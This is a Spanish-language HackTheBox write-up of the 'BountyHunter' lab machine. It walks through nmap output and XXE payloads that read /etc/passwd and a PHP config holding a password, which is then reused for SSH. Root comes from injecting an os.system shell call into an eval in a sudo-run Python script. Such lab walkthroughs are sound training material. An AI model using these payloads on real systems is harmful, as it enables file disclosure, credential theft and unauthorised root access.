---
layout: single
title: Writeup HTB - Maquina BountyHunter
comments: true
excerpt: "La maquina BountyHunter es una maquina linux - Easy,  nos encontramos con una pagina web relacionada a Bounty Hounters accedemos a una funcion de la aplicacion web y entre los recursos encontramos un archivo javascript que indica que podemos hacer una solicitud por metodo POST donde enviaremos en base64 un xml. Asi pues logramos realizar un ataque de XEE que nos permite revisar el contenido de un archivo en el servidor, logrando obtener credenciales que nos servira para acceder con el usuario development por SSH. Por ultimo logramos escalar privilegios a root revisando los permisos de sudo, ya que podemos ejecutar ticketValidator.py con permisos de root."
date: 2022-02-05
classes: wide
header:
  teaser: /assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - xxe
  - Easy
---

# HTB - BountyHacker
<p align="center">
<img src="/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina BountyHunter es una maquina linux - Easy,  nos encontramos con una pagina web relacionada a Bounty Hounters accedemos a una funcion de la aplicacion web y entre los recursos encontramos un archivo javascript que indica que podemos hacer una solicitud por metodo POST donde enviaremos en base64 un xml. Asi pues logramos realizar un ataque de XEE que nos permite revisar el contenido de un archivo en el servidor, logrando obtener credenciales que nos servira para acceder con el usuario development por SSH. Por ultimo logramos escalar privilegios a root revisando los permisos de sudo, ya que podemos ejecutar ticketValidator.py con permisos de root. 
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Fri Oct 29 19:10:30 2021 as: nmap -sC -sV -p22,80 -oN targeted -Pn -vvv 10.129.249.108
Nmap scan report for 10.129.249.108
Host is up, received user-set (0.18s latency).
Scanned at 2021-10-29 19:10:32 -05 for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 29 19:10:45 2021 -- 1 IP address (1 host up) scanned in 14.40 seconds
```

al comenzar nuestro analisis nmap nos muestra que tenemos dos puertos 22 y 80. Asi que por obvias razones  por el momento deberiamos centrarnos primero en la aplicacion web

### Port 80

al entrar en dicha web, vemos que esta relacionado a bug bounty hunters

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%201.png)

si  vamos a la opcion portal vemos algo interesante 

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%202.png)

nos sugiere ir a un portal en construccion

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%203.png)

interceptamos con burpsuite y mandando datos random para probar esta funcion y  vemos esto 

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%204.png)

```bash
HTTP/1.1 200 OK
Date: Sat, 30 Oct 2021 00:19:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 15 Jun 2021 15:47:22 GMT
ETag: "252-5c4cfe3cc67e3-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 594
Connection: close
Content-Type: application/javascript

function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

al parecer vemos que vamos a mandar los datos ingresados en formato xml en base64, pero probemos esto e interceptemos la consulta

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%205.png)

si decodificamos el contenido de la variable data, comprobamos nuestra suposicion

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%206.png)

### XXE Injection

teniendo esta informacion intentemos explotar esto de esta manera

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>test</title>
		<cwe>&ent;</cwe>
		<cvss>ccxcxc</cvss>
		<reward>xcxcxcxcx</reward>
		</bugreport>
```

en el decoder de burpsuite lo encodeareamos en base64 y copiaremos el contenido en el valor de data y haremos un url encoder a ese valor (click derecho > convert selection > URL Encoder > url-encode key characters), el resultado fue que pudimos ver /etc/passwd y obtenemos un usuario Development

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%207.png)

intente muchas formas de aprovechar esto para acceder a la maquina y en la web de hacktricks me ayudo mucho para este cometido

```bash
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
```

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>prueba </title>
		<cwe>&ent;</cwe>
		<cvss>ccxcxc</cvss>
		<reward>xcxcxcxcx</reward>
		</bugreport>
```

codificamos en base64 y le damos url encode y enviamos como respuesta obtenemos un salida en base64

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%208.png)

decodificamos esta string y encontramos credenciales

```bash
❯ echo PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo= | base64 -d 
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

nos conectamos por ssh con las siguientes credenciales

```bash
development:m19RoAU0hP41A1sTsq6K
```

de esta manera accedemos como el usuario Development

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%209.png)

### Escalacion Privilegios

para escalar privilegios revisamos los permisos de sudo y vemos que podemos ejecutar un script de python con permisos de root 

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%2010.png)

lo bueno de esto es que podemos leer el contenido de ticketValidator.py

```bash
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

analizando vemos que el script lee un documento con extension md, yo le puse abel.md

```bash
# Skytrain Inc
## Ticket to abel
__Ticket Code:__
**193+44+33
```

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%2011.png)

la linea que me llamo la atencion fue esta

```bash
validationNumber = eval(x.replace("**", ""))
```

averiguando encontramos que nuestra via de explotacion es esta

```bash
https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes
```

asi que el codigo para poder escalar sera esta, le puse el nombre a este root.md

```bash
# Skytrain Inc
## Ticket to abel
__Ticket Code:__
**193+__import__('os').system('/bin/bash')
```

y lo ejecute de esta manera, logrando ser root 

![Untitled](/assets/images/2022-02-06-writeup-maquina-htb-bountyhounter/Untitled%2012.png)

gracias por leer este writeup, nos vemos AbelJM.